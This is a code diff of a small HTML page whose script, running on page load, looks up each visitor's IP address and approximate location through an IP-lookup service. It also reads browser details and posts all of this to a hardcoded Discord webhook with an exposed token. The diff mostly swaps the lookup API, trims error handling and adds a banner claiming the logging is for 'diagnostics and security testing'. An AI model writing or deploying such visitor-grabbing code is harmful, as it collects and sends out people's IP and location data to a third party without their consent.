@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Hi</title>
   <style>
@@ -19,15 +19,14 @@
   </style>
 </head>
 <body>
-  <h1>Hello 👋</h1>
+  <h1>👁️ Visitor Info Logged</h1>
+  <p>This site logs visitor information for diagnostics and security testing.</p>
 
   <script>
     async function getVisitorInfo() {
       try {
-        const res = await fetch('https://ipwho.is/');
-        if (!res.ok) throw new Error('Failed to fetch IP info.');
+        const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
-        if (!data.success) throw new Error('IP lookup failed.');
 
         const userAgent = navigator.userAgent;
         const language = navigator.language || navigator.userLanguage;
@@ -48,16 +47,16 @@
 
 🌐 **Network Info**
 • IP: \`${data.ip}\`
-• ISP: ${data.connection.isp || 'N/A'}
-• Country: ${data.country || 'N/A'}
-• Region: ${data.region || 'N/A'}
-• City: ${data.city || 'N/A'}
-• Postal: ${data.postal || 'N/A'}
-• Timezone: ${data.timezone || 'N/A'}
+• ISP: ${data.org}
+• Country: ${data.country_name} (${data.country})
+• Region: ${data.region}
+• City: ${data.city}
+• Postal: ${data.postal}
+• Timezone: ${data.timezone}
 
 📌 **Location**
-• Latitude: ${data.latitude || 'N/A'}
-• Longitude: ${data.longitude || 'N/A'}
+• Latitude: ${data.latitude}
+• Longitude: ${data.longitude}
         `;
 
         await fetch("https://discord.com/api/webhooks/1365451163214024805/8OezJtvTg9WGDTX6vrHHr3z0eMq04t4NlVl0SUMDfhAOlg_l_Hyq4m6uDL2mEeUZwt3t", {
@@ -65,20 +64,11 @@
           headers: {
             "Content-Type": "application/json"
           },
-          body: JSON.stringify({
-            content: content,
-            username: "Logger Bot 🔍"
-          })
-        }).then(response => {
-          if (!response.ok) {
-            console.error('Discord Webhook Failed:', response.status);
-          }
-        }).catch(err => {
-          console.error('Fetch to Discord failed:', err);
+          body: JSON.stringify({ content })
         });
 
       } catch (err) {
-        console.error("Error in visitor info collection:", err);
+        console.error("Failed to fetch/send visitor info:", err);
       }
     }
 
